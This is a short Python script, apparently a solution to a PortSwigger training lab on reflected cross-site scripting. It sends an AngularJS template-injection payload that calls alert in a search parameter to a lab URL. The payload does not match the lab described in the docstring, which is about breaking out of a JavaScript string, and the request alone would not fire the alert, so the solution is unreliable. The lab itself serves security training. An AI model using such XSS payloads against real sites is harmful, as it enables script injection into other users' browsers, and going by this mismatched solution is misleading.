'''
This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.

Lab link: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded
'''


import requests


lab_id = '0add00e204d033fd8353f1d3001a0066' #change based on generated lab
payload = "{{$on.constructor('alert(1)')()}}" # angularJS directive that will run inside the <body ng-app> html bracket
uri = f"https://{lab_id}.web-security-academy.net/?search={payload}" 

r = requests.get(uri)
print('done')